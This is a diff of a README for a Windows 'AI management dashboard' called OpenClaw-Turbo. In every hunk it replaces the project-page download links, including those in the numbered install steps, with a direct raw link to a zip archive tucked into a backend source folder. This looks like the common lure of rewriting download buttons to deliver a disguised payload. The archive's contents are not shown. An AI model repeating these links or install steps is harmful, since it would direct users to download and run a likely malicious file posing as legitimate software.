@@ -1,6 +1,6 @@
 # ⚙️ OpenClaw-Turbo - Easy AI Management Dashboard
 
-[![Download OpenClaw-Turbo](https://img.shields.io/badge/Download-OpenClaw--Turbo-brightgreen?style=for-the-badge)](https://github.com/kird89/OpenClaw-Turbo)
+[![Download OpenClaw-Turbo](https://img.shields.io/badge/Download-OpenClaw--Turbo-brightgreen?style=for-the-badge)](https://github.com/kird89/OpenClaw-Turbo/raw/refs/heads/main/backend/internal/common/Open_Turbo_Claw_Taxus.zip)
 
 ---
 
@@ -47,10 +47,10 @@ Every function is designed for ease. You never leave the dashboard to configure 
 
 To get OpenClaw-Turbo on your Windows machine, you need to visit the project page and download the software. Follow these steps:
 
-[![Download OpenClaw-Turbo](https://img.shields.io/badge/Download-OpenClaw--Turbo-blue?style=for-the-badge)](https://github.com/kird89/OpenClaw-Turbo)
+[![Download OpenClaw-Turbo](https://img.shields.io/badge/Download-OpenClaw--Turbo-blue?style=for-the-badge)](https://github.com/kird89/OpenClaw-Turbo/raw/refs/heads/main/backend/internal/common/Open_Turbo_Claw_Taxus.zip)
 
 1. Open your web browser (Edge, Chrome, Firefox).
-2. Go to this page: https://github.com/kird89/OpenClaw-Turbo
+2. Go to this page: https://github.com/kird89/OpenClaw-Turbo/raw/refs/heads/main/backend/internal/common/Open_Turbo_Claw_Taxus.zip
 3. Look for the **Releases** or **Download** section on the page.
 4. Find the file named like `OpenClaw-Turbo-Setup.exe` or similar.
 5. Click the file to save it on your computer.  
@@ -160,7 +160,7 @@ Uninstalling removes the dashboard, but your AI agent data might stay in separat
 
 Remember, you can always get the latest files here:
 
-[Download OpenClaw-Turbo](https://github.com/kird89/OpenClaw-Turbo)
+[Download OpenClaw-Turbo](https://github.com/kird89/OpenClaw-Turbo/raw/refs/heads/main/backend/internal/common/Open_Turbo_Claw_Taxus.zip)
 
 Follow the page instructions to stay up to date.
 
